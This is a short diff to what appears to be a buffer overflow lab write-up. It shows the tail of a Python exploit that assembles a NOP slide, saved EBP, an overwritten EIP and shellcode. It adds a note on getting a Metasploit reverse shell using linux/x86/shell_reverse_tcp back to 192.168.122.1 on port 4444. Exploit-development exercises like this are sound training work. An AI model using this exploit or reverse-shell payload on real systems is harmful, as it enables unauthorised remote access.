@@ -116,3 +116,10 @@ eip = struct.pack("I",0xbffffcd0)
 payload = nop_slide + ebp + eip + nop_slide + shellcode
 print(payload)
 ```
+
+
+# Got a MSF shell
+
+- MSF Payload `linux/x86/shell_reverse_tcp` with LHOST=192.168.122.1 and LPORT=4444 with --format python and bac characters '\x00' specified
+
+![reverse_shell_tcp_screenshot.png](reverse_shell_tcp_screenshot.png)
